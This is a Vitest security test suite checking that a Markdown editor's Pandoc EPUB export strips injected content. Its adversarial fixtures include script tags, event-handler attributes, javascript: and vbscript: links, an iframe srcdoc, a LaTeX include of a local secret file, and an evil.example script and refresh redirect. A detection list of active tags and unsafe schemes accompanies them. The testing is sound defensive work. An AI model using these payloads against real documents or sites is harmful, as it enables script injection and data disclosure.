import { afterEach, describe, expect, it } from 'vitest'
import { existsSync } from 'node:fs'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { pathToFileURL } from 'node:url'
import { inflateRawSync } from 'node:zlib'
import { PandocService } from '../src/main/pandoc-service'
import { pandocExportSchema } from '../src/shared/pandoc'

const executable = process.env.TTYPORA_TEST_PANDOC ?? path.resolve('.tools/pandoc/pandoc-3.12/pandoc.exe')
const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=', 'base64')
const directories: string[] = []

afterEach(async () => {
  for (const directory of directories.splice(0)) {
    const absolute = path.resolve(directory), root = path.resolve(tmpdir()), relative = path.relative(root, absolute)
    if (!relative.startsWith('ttypora-pandoc-security-') || relative.includes(path.sep)) throw new Error('Unexpected security fixture cleanup path')
    await rm(absolute, { recursive: true, force: true })
  }
})

/** Read only the small, unencrypted ZIPs emitted by the real Pandoc fixture. */
function readPandocZip(bytes: Buffer): Map<string, Buffer> {
  let end = -1
  for (let offset = bytes.length - 22; offset >= Math.max(0, bytes.length - 65557); offset--) if (bytes.readUInt32LE(offset) === 0x06054b50) { end = offset; break }
  if (end < 0) throw new Error('EPUB central directory not found')
  const count = bytes.readUInt16LE(end + 10), entries = new Map<string, Buffer>()
  let offset = bytes.readUInt32LE(end + 16)
  for (let index = 0; index < count; index++) {
    if (bytes.readUInt32LE(offset) !== 0x02014b50) throw new Error('Invalid ZIP central directory')
    const flags = bytes.readUInt16LE(offset + 8), method = bytes.readUInt16LE(offset + 10), compressed = bytes.readUInt32LE(offset + 20), expanded = bytes.readUInt32LE(offset + 24)
    const nameLength = bytes.readUInt16LE(offset + 28), extraLength = bytes.readUInt16LE(offset + 30), commentLength = bytes.readUInt16LE(offset + 32), local = bytes.readUInt32LE(offset + 42)
    const name = bytes.subarray(offset + 46, offset + 46 + nameLength).toString('utf8')
    if (flags & 1 || ![0, 8].includes(method) || expanded > 16 * 1024 * 1024) throw new Error('Unexpected encrypted, compressed or oversized fixture entry')
    if (bytes.readUInt32LE(local) !== 0x04034b50) throw new Error('Invalid ZIP local header')
    const dataFrom = local + 30 + bytes.readUInt16LE(local + 26) + bytes.readUInt16LE(local + 28)
    const data = bytes.subarray(dataFrom, dataFrom + compressed)
    const decoded = method === 0 ? data : inflateRawSync(data, { maxOutputLength: 16 * 1024 * 1024 })
    if (decoded.length !== expanded) throw new Error('Unexpected ZIP fixture size')
    entries.set(name, decoded)
    offset += 46 + nameLength + extraLength + commentLength
  }
  return entries
}

async function inspectXhtml(entries: Map<string, Buffer>) {
  const { fromHtml } = await import('hast-util-from-html')
  const documents: Array<{ name: string; html: string; elementCount: number; mathCount: number; imageCount: number }> = []
  const violations: string[] = []
  const activeTags = new Set(['script', 'iframe', 'object', 'embed', 'applet', 'base', 'form'])
  for (const [name, bytes] of entries) {
    if (!/\.(?:xhtml|html)$/i.test(name)) continue
    const html = bytes.toString('utf8'), root = fromHtml(html)
    let elementCount = 0, mathCount = 0, imageCount = 0
    const visit = (node: typeof root | (typeof root.children)[number]) => {
      if (node.type === 'element') {
        elementCount++
        if (activeTags.has(node.tagName.toLowerCase().replace(/^.*:/, ''))) violations.push(`${name}: active <${node.tagName}>`)
        if (node.tagName === 'img') imageCount++
        if (node.tagName === 'math' || (node.properties.className as string[] | undefined)?.includes('math')) mathCount++
        for (const [key, value] of Object.entries(node.properties)) {
          if (/^on/i.test(key) || key.toLowerCase() === 'srcdoc') violations.push(`${name}: active attribute ${key}`)
          if (/^(?:href|src|xLinkHref)$/i.test(key) && typeof value === 'string' && /^(?:javascript|vbscript|file|data:text\/html):/i.test(value.replace(/[\u0000-\u0020\u007f]/g, ''))) violations.push(`${name}: unsafe ${key}=${value}`)
        }
        if (node.tagName === 'meta' && (node.properties.httpEquiv as string[] | undefined)?.some((value) => value.toLowerCase() === 'refresh')) violations.push(`${name}: refresh meta`)
      }
      if ('children' in node) node.children.forEach(visit)
    }
    visit(root)
    documents.push({ name, html, elementCount, mathCount, imageCount })
  }
  for (const [name, bytes] of entries) {
    if (/\.(?:js|mjs|cjs)$/i.test(name)) violations.push(`Packaged script: ${name}`)
    if (/\.opf$/i.test(name) && /\bproperties\s*=\s*["'][^"']*\bscripted\b/i.test(bytes.toString('utf8'))) violations.push(`Scripted EPUB manifest: ${name}`)
  }
  return { documents, violations }
}

describe.skipIf(!existsSync(executable))('real EPUB archive security', () => {
  it.each(['{=html}', '{foo}', 'html extra', '{=html .x}', 'html {onclick=CODE_INFO_EVENT}', '{.html onmouseover="CODE_INFO_EVENT"}'])('keeps script-like code literal when a CommonMark tilde fence has info %s', async (info) => {
    const directory = await mkdtemp(path.join(tmpdir(), 'ttypora-pandoc-security-')); directories.push(directory)
    const target = path.join(directory, 'code.epub'), service = new PandocService(path.join(directory, 'settings.json'), executable)
    const markdown = `# Code sample\n\n~~~${info}\n<script>CODE_LITERAL_PROBE</script>\n<img src=x onerror=CODE_EVENT_PROBE>\n~~~\n`
    await service.exportDocument(402, pandocExportSchema.parse({ markdown, sourcePath: null, suggestedName: 'code.epub', format: 'epub3' }), target)
    const inspected = await inspectXhtml(readPandocZip(await readFile(target)))
    expect(inspected.documents.length).toBeGreaterThan(0)
    expect(inspected.violations).toEqual([])
    expect(inspected.documents.some((document) => document.html.includes('<pre') && document.html.includes('CODE_LITERAL_PROBE'))).toBe(true)
  }, 10000)

  it('keeps script-like code literal inside blockquote and list containers', async () => {
    const directory = await mkdtemp(path.join(tmpdir(), 'ttypora-pandoc-security-')); directories.push(directory)
    const target = path.join(directory, 'containers.epub'), service = new PandocService(path.join(directory, 'settings.json'), executable)
    const markdown = '# Nested code\n\n> ~~~html {onclick=INFO_EVENT}\n> <script>QUOTE_CODE</script>\n> ~~~\n\n- Item\n\n  ~~~{=html}\n  <img src=x onerror=LIST_CODE_EVENT>\n  ~~~\n'
    await service.exportDocument(403, pandocExportSchema.parse({ markdown, sourcePath: null, suggestedName: 'containers.epub', format: 'epub3' }), target)
    const inspected = await inspectXhtml(readPandocZip(await readFile(target)))
    expect(inspected.violations).toEqual([])
    const content = inspected.documents.map((document) => document.html).join('\n')
    expect(content).toContain('QUOTE_CODE')
    expect(content).toContain('LIST_CODE_EVENT')
    expect((content.match(/<pre/g) ?? []).length).toBe(2)
  }, 10000)

  it('writes safe XHTML directly into the EPUB archive with Markdown, HTML and metadata attacks removed', async () => {
    const directory = await mkdtemp(path.join(tmpdir(), 'ttypora-pandoc-security-')); directories.push(directory)
    const source = path.join(directory, 'source.md'), target = path.join(directory, 'safe.epub'), secret = path.join(directory, 'secret.txt')
    await writeFile(path.join(directory, 'pixel.png'), pixel)
    await writeFile(secret, 'PRIVATE_FIXTURE_MUST_NOT_ENTER_EPUB')
    const fileUrl = pathToFileURL(secret).href
    const markdown = `---
title: "Safe book <script>METADATA_SCRIPT</script>"
author: "Safe Author"
custom-engine: &engine '\\input{${secret.replaceAll('\\', '/')}}'
custom-script: &script '<script src="https://evil.example/payload.js">ALIASED_SCRIPT</script>'
header-includes:
  - *engine
  - *script
  - '<meta http-equiv="refresh" content="0;url=https://evil.example">'
include-before: '<iframe srcdoc="<script>FRAME_SCRIPT</script>">UNSAFE_FRAME_BODY</iframe>'
include-after: *engine
---

# Safe chapter

[**Bad JS label**](javascript:alert(1)) [Bad VB label](vbscript:bad()) [Bad file label](${fileUrl}) [Reference label][unsafe]

[unsafe]: javascript:REFERENCE_SCRIPT

<u onclick="UNDERLINE_EVENT">Underlined text</u> <a href="java&#10;script:HTML_LINK_SCRIPT">HTML label</a> <script>BODY_SCRIPT</script>

<object data="x">UNSAFE_OBJECT_BODY</object>

<img src="pixel.png" alt="Safe pixel" onerror="IMAGE_EVENT">

![Blocked file image](${fileUrl})

[Safe web](https://example.com) [Safe mail](mailto:a@example.com)

$x^2 + y^2$

| A | B |
|---|---|
| 1 | 2 |

~~~{=html}
<script>CODE_LITERAL_MUST_REMAIN_TEXT</script>
~~~
`
    await writeFile(source, markdown)
    const service = new PandocService(path.join(directory, 'settings.json'), executable)
    const status = await service.detect()
    expect(status.available).toBe(true)
    const result = await service.exportDocument(401, pandocExportSchema.parse({ markdown, sourcePath: source, suggestedName: 'safe.epub', format: 'epub3', options: { toc: true } }), target, directory)
    const archive = readPandocZip(await readFile(target)), inspected = await inspectXhtml(archive)
    const artifacts = path.resolve('artifacts/pandoc-security')
    await mkdir(artifacts, { recursive: true })
    await writeFile(path.join(artifacts, 'adversarial.epub'), await readFile(target))
    for (let index = 0; index < inspected.documents.length; index++) await writeFile(path.join(artifacts, `inspected-${index}.xhtml`), inspected.documents[index].html)
    await writeFile(path.join(artifacts, 'verification.json'), JSON.stringify({ runtime: status.version, executable: status.executablePath, entries: [...archive.keys()], xhtml: inspected.documents.map(({ html: _html, ...details }) => details), violations: inspected.violations, warnings: result.warnings, checked: 'Direct ZIP XHTML and OPF inspection; no EPUB re-import used' }, null, 2))
    if (inspected.violations.length) {
      await writeFile(path.join(artifacts, 'first-failure.json'), JSON.stringify({ violations: inspected.violations, warnings: result.warnings }, null, 2))
      for (let index = 0; index < inspected.documents.length; index++) await writeFile(path.join(artifacts, `first-failure-${index}.xhtml`), inspected.documents[index].html)
    }
    expect(archive.get('mimetype')?.toString()).toBe('application/epub+zip')
    expect(inspected.documents.length).toBeGreaterThanOrEqual(2)
    expect(inspected.violations).toEqual([])
    const allXhtml = inspected.documents.map((document) => document.html).join('\n')
    expect(allXhtml).toContain('Safe book')
    expect(allXhtml).toContain('Safe Author')
    expect(allXhtml).toContain('Bad JS label')
    expect(allXhtml).toContain('Reference label')
    expect(allXhtml).toContain('<u>Underlined text</u>')
    expect(allXhtml).toContain('href="https://example.com"')
    expect(allXhtml).toContain('href="mailto:a@example.com"')
    expect(allXhtml).toContain('CODE_LITERAL_MUST_REMAIN_TEXT')
    expect(allXhtml).toContain('<table')
    expect(inspected.documents.reduce((total, document) => total + document.mathCount, 0)).toBeGreaterThan(0)
    expect(inspected.documents.reduce((total, document) => total + document.imageCount, 0)).toBeGreaterThan(0)
    expect([...archive].filter(([name]) => /\.png$/i.test(name)).map(([, bytes]) => bytes)).toContainEqual(pixel)
    expect([...archive].filter(([name]) => /\.(?:xml|opf|xhtml|html)$/i.test(name)).map(([, bytes]) => bytes.toString('utf8')).join('\n')).not.toMatch(/PRIVATE_FIXTURE_MUST_NOT_ENTER_EPUB|METADATA_SCRIPT|ALIASED_SCRIPT|FRAME_SCRIPT|UNSAFE_FRAME_BODY|UNSAFE_OBJECT_BODY|UNDERLINE_EVENT|HTML_LINK_SCRIPT|BODY_SCRIPT|IMAGE_EVENT/)
    expect(result.warnings).toMatch(/原始引擎|元数据|Markdown/)
  }, 20000)
})
